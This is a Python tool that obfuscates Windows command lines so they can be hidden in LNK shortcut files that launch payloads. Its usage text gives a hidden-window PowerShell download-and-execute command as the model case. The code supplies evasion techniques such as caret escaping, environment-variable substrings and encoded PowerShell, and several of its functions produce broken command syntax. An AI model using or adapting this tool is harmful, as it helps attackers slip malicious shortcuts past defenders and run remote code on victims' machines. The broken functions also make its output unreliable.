#!/usr/bin/env python3
"""
Advanced Command Obfuscator for LNK Payload Execution

This script provides various techniques to obfuscate Windows command line instructions,
specifically tailored for use with LNK files to trigger payloads such as DLLs, EXEs, PS1, or BAT files.

Usage:
    python obfuscator.py [OPTIONS] COMMAND

    COMMAND is the Windows command line instruction you want to obfuscate.

Options:
    -h, --help                      Show this help message and exit
    -i ITERATIONS, --iterations ITERATIONS
                                    Number of obfuscation iterations (default: 5)
    -t TECHNIQUES [TECHNIQUES ...], --techniques TECHNIQUES [TECHNIQUES ...]
                                    Specific techniques to use (default: all)
    -c {1,2,3}, --complexity {1,2,3}
                                    Obfuscation complexity level (default: 2)
    -f {oneline,multiline}, --format {oneline,multiline}
                                    Output format (default: oneline)
    --chain                         Apply techniques in order instead of randomly
    --verify                        Verify the obfuscated command functionality (may execute commands)

Available Techniques:
    env_var_substitution            Use environment variable substitution
    caret_escaping                  Escape characters with carets
    command_concatenation           Concatenate command parts
    base64_encoding                 Encode command in base64
    reverse_string                  Reverse the command string
    character_substitution          Substitute characters with variables
    ignored_characters              Add ignored characters
    string_substitution             Substitute parts of the string
    substring                       Use substrings of environment variables
    forfiles_obfuscation            Use the forfiles command
    findstr_obfuscation             Use the findstr command
    call_obfuscation                Use the call command
    parenthesis_obfuscation         Add parentheses
    multi_line_obfuscation          Split command into multiple lines
    combine_techniques              Combine multiple techniques
    powershell_encode               Encode PowerShell commands

Examples of optimal obfuscation chains:

    1. PowerShell command obfuscation:
       python obfuscator.py "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://example.com/payload.ps1')" --chain -t string_substitution command_concatenation powershell_encode -i 3 -c 2

    2. CMD command obfuscation:
       python obfuscator.py "cmd.exe /c echo Hello World" --chain -t string_substitution env_var_substitution caret_escaping -i 3 -c 2

    3. Executable launch obfuscation:
       python obfuscator.py "C:\\Windows\\System32\\calc.exe" --chain -t string_substitution command_concatenation env_var_substitution -i 3 -c 2

Note: This tool is for educational and defensive purposes only. Ensure you have proper authorization
before using obfuscated commands on any system.
"""

import argparse
import base64
import random
import string
import re
import subprocess

def escape_special_chars(cmd):
    return cmd.replace('"', '\\"').replace('&', '^&').replace('|', '^|').replace('<', '^<').replace('>', '^>')

def validate_input(cmd):
    if not cmd or not isinstance(cmd, str):
        raise ValueError("Invalid command input")
    
    common_patterns = [
        r'powershell',
        r'cmd\.exe',
        r'\.exe',
        r'\.dll',
        r'\.ps1',
        r'\.bat',
        r'IEX',
        r'Invoke-Expression',
        r'Net\.WebClient',
        r'DownloadString',
        r'System\.Reflection\.Assembly'
    ]
    
    if not any(re.search(pattern, cmd, re.IGNORECASE) for pattern in common_patterns):
        print("Warning: The command doesn't match common LNK payload execution patterns.")
    
    return escape_special_chars(cmd)

def env_var_substitution(cmd, complexity=2):
    env_vars = ['COMSPEC', 'SYSTEMROOT', 'TEMP', 'WINDIR', 'PROGRAMDATA', 'APPDATA', 'LOCALAPPDATA']
    var = random.choice(env_vars)
    start = random.randint(0, min(5, len(var)-1))
    length = random.randint(1, len(var)-start)
    return f'%{var}:~{start},{length}%{cmd[0]} /c {cmd}'

def caret_escaping(cmd, complexity=2):
    return '^'.join(cmd) + '^' * complexity

def command_concatenation(cmd, complexity=2):
    parts = re.findall(r'\w+|[^\w\s]', cmd)
    concat_cmd = '&&'.join([f'set _{i}={part}' for i, part in enumerate(parts)])
    concat_cmd += '&&' + ''.join([f'%_{i}%' for i in range(len(parts))])
    return f'{"cmd /v:on /c " * complexity}"{concat_cmd}"'

def base64_encoding(cmd, complexity=2):
    encoded = base64.b64encode(cmd.encode()).decode()
    decoder = 'powershell -enc ' if complexity > 1 else ''
    return f'{decoder}{encoded}'

def reverse_string(cmd, complexity=2):
    reversed_cmd = cmd[::-1]
    if complexity > 1:
        reversed_cmd = ' '.join(word[::-1] for word in reversed_cmd.split())
    return f'cmd /c for /F "delims=:" %i in (\'echo {reversed_cmd}\') do %i'

def character_substitution(cmd, complexity=2):
    chars = string.ascii_lowercase + string.digits
    subs = {c: f'%{random.choice(chars)}%' for c in cmd}
    subbed_cmd = ''.join(subs.get(c, c) for c in cmd)
    sets = ' && '.join([f'set {v[1]}={k}' for k, v in subs.items()])
    return f'{"cmd /v:on /c " * complexity}"{sets} && {subbed_cmd}"'

def ignored_characters(cmd, complexity=2):
    ignored = '^;"`'
    return 'cmd.exe /c ' + ''.join(c + random.choice(ignored) * complexity for c in cmd)

def string_substitution(cmd, complexity=2):
    sub_chars = random.sample(string.punctuation, min(len(string.punctuation), len(cmd), complexity * 2))
    subs = {}
    cmd_sub = cmd
    for char in sub_chars:
        if char not in cmd_sub:
            target = random.choice(cmd_sub)
            cmd_sub = cmd_sub.replace(target, char)
            subs[char] = target
    sub_cmds = ' && '.join([f'set _sub{i}=%_sub{i}:{k}={v}%' for i, (k, v) in enumerate(subs.items())])
    init_cmd = f'set _sub0={cmd_sub}'
    echo_cmd = f'echo %_sub{len(subs)-1}%'
    return f'cmd /v:on /c "{init_cmd} && {sub_cmds} && {echo_cmd}"'

def substring(cmd, complexity=2):
    env_vars = ['COMSPEC', 'SYSTEMROOT', 'TEMP', 'WINDIR', 'PROGRAMDATA', 'APPDATA', 'LOCALAPPDATA']
    var = random.choice(env_vars)
    start = random.randint(0, min(5, len(var)-1))
    return f'%{var}:~{start},{complexity}%md /c {cmd}'

def forfiles_obfuscation(cmd, complexity=2):
    return f'{"forfiles /p %SYSTEMROOT% /m notepad.exe /c " * complexity}"{cmd}"'

def findstr_obfuscation(cmd, complexity=2):
    random_str = ''.join(random.choice(string.ascii_letters) for _ in range(10))
    while random_str in cmd:
        random_str = ''.join(random.choice(string.ascii_letters) for _ in range(10))
    parts = cmd.split()
    obfuscated_parts = []
    for part in parts:
        hex_part = ''.join([hex(ord(c))[2:].zfill(2) for c in part])
        obfuscated_part = f'for /f "tokens=*" %i in (\'findstr /r /c:"^{random_str}$" ^<nul\') do @set /p "={hex_part}"<nul>%i'
        obfuscated_parts.append(obfuscated_part)
    final_cmd = ' & '.join(obfuscated_parts) + f' & findstr /a:{random.randint(0,7)} "^" nul | cmd'
    return f'{"cmd /c " * complexity}{final_cmd}'

def call_obfuscation(cmd, complexity=2):
    return f'{"call " * complexity}{cmd}'

def parenthesis_obfuscation(cmd, complexity=2):
    return f'{"(" * complexity}{cmd}{"))" * (complexity-1)}'

def multi_line_obfuscation(cmd, complexity=2):
    parts = cmd.split()
    return '^\n'.join(parts) + '^' * complexity

def combine_techniques(cmd, complexity=2):
    techniques = [findstr_obfuscation, string_substitution]
    num_techniques = random.randint(2, 4)
    for _ in range(num_techniques):
        technique = random.choice(techniques)
        cmd = technique(cmd, complexity)
    return cmd

def powershell_encode(cmd, complexity=2):
    encoded = base64.b64encode(cmd.encode('utf-16le')).decode()
    return f'powershell -nop -w hidden -e {encoded}'

def complex_obfuscate(cmd, iterations=5, techniques=None, complexity=2, chain=False):
    cmd = validate_input(cmd)
    if techniques is None:
        techniques = [
            env_var_substitution,
            caret_escaping,
            command_concatenation,
            base64_encoding,
            reverse_string,
            character_substitution,
            ignored_characters,
            string_substitution,
            substring,
            forfiles_obfuscation,
            findstr_obfuscation,
            call_obfuscation,
            parenthesis_obfuscation,
            multi_line_obfuscation,
            combine_techniques,
            powershell_encode
        ]
    
    for i in range(iterations):
        technique = techniques[i % len(techniques)] if chain else random.choice(techniques)
        try:
            cmd = technique(cmd, complexity)
        except Exception as e:
            print(f"Error applying {technique.__name__}: {str(e)}")
            continue
    
    return cmd

def test_obfuscated_command(original_cmd, obfuscated_cmd):
    try:
        original_output = subprocess.check_output(original_cmd, shell=True, stderr=subprocess.STDOUT)
        obfuscated_output = subprocess.check_output(obfuscated_cmd, shell=True, stderr=subprocess.STDOUT)
        return original_output == obfuscated_output
    except subprocess.CalledProcessError:
        return False

def main():
    parser = argparse.ArgumentParser(description='Advanced Command Obfuscator for LNK Payload Execution', 
                                     formatter_class=argparse.RawDescriptionHelpFormatter,
                                     epilog=__doc__)
    parser.add_argument('command', help='Command to obfuscate')
    parser.add_argument('-i', '--iterations', type=int, default=5, help='Number of obfuscation iterations')
    parser.add_argument('-t', '--techniques', nargs='+', help='Specific techniques to use')
    parser.add_argument('-c', '--complexity', type=int, choices=[1,2,3], default=2, help='Obfuscation complexity level')
    parser.add_argument('-f', '--format', choices=['oneline', 'multiline'], default='oneline', help='Output format')
    parser.add_argument('--chain', action='store_true', help='Apply techniques in order instead of randomly')
    parser.add_argument('--verify', action='store_true', help='Verify the obfuscated command functionality (may execute commands)')

    args = parser.parse_args()

    techniques = [globals()[t] for t in args.techniques] if args.techniques else None
    
    obfuscated = complex_obfuscate(args.command, args.iterations, techniques, args.complexity, args.chain)
    
    if args.format == 'multiline':
        obfuscated = obfuscated.replace('&&', '^\n')
    
    print(f"Obfuscated command: {obfuscated}")
    
    if args.verify:
        if test_obfuscated_command(args.command, obfuscated):
            print("Obfuscated command verified to produce the same output as the original.")
        else:
            print("Warning: Obfuscated command may not produce the same output as the original.")

if __name__ == "__main__":
    main()